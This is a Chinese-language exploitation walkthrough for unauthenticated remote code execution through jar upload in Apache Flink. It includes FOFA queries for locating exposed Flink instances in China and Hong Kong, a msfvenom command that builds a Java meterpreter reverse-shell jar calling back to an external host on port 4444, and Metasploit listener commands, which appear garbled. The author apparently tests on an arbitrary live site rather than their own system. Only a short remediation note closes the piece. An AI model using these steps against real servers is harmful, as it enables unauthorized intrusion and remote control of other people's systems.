## Apache Flink 未授权访问+远程代码执行  

### 前言

近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞，影响范围：<= 1.9.1(最新版本) 此次复现就是通过版本Version: 1.10.1进行复现利用。

* * *

### FOFA

```

FOFA 语句"Apache-Flink" && country="CN"
"Apache-Flink" && country="CN" && region="HK"

```

![](../Images/e8a9a20693df3b147cae2b842d63bc84.png)

*   国内还是很多使用 Apache Flink 的，大概有1K+的数量左右

### 漏洞复现

* * *

1、这里随便搞个站打开进行复现，打开以后就长这样子。

![](../Images/3a4832c0a963e25b381d4b5206197a33.png)

点击`Submit New Job`翻译：文件上传 2、打开MSF 生成一个 jar 木马

```

msfvenom -p java/meterpreter/reverse_tcp LHOST=**.***.59.61  LPORT=4444 -f jar > testone.jar
```

![](../Images/31f4f65ba5f99c9deb1ea8df08fd84b3.png)

3、点击 Add 上传 jar 文件

![](../Images/8b5e070b149bbdc4f0b6f17090c99bc1.png)

4、设置监听端口

```


msf5 > use exploit/multi/handlerset

 payload java/shell/reverse_tcp set

 lhost XX.XXX.XX.61set

 lport 4444
```

![](../Images/14f2a9f522efa08d75f4ba86a9d3ca64.png)

5、点击下 submit

![](../Images/a0960aa5bac550e8d7126af7ba413ef2.png)

6、反弹shell成功

![](../Images/de081bed836a69b853f63a5b53482be6.png)

### 修复建议

建议用户关注Apache Flink官网，及时获取该漏洞最新补丁。临时解决建议 设置IP白名单只允许信任的IP访问控制台并添加访问认证。
